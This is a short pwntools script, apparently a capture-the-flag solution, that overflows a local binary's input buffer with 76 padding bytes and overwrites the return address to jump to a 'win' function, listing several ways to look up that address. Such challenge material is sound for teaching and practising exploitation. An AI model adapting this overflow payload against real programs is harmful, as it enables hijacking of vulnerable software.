from pwn import *

elf = ELF('./challenge')
context.binary = elf

offset = 76
win_address = 0x080491a6
# or
win_address = elf.symbols['win']
# or
win_address = elf.sym['win']
# or
win_address = elf.functions['win'].address

payload = b'A' * offset
payload += pack(win_address)

p = process('./challenge')

p.sendlineafter(b'input: ', payload)

p.interactive()